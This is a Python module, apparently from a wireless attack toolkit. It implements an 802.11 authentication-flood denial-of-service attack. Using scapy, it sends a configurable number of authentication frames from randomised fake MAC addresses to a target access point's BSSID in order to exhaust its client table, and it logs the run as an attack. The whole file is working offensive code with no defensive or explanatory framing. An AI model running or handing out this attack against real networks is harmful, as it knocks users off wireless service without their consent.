"""
Authentication DoS: flood AP with auth requests to exhaust client table.
"""
from scapy.all import sendp
from daemon.modules.utils.packet_crafter import PacketCrafter
import random


class AuthDoS:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger

    def run(self, args):
        bssid = args.bssid
        iface = self.config.mon_iface
        count = args.count

        if not bssid:
            self.logger.error("BSSID required for Auth DoS.")
            return False

        self.logger.attack_log(f"Auth DoS -> {bssid} x{count}")
        try:
            for i in range(count):
                client = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
                pkt = PacketCrafter.auth_flood(bssid, client, seq=(i % 4096)+1)
                sendp(pkt, iface=iface, verbose=0)
            self.logger.success("Auth DoS complete.")
            return True
        except Exception as e:
            self.logger.error(f"Auth DoS failed: {e}")
            return False
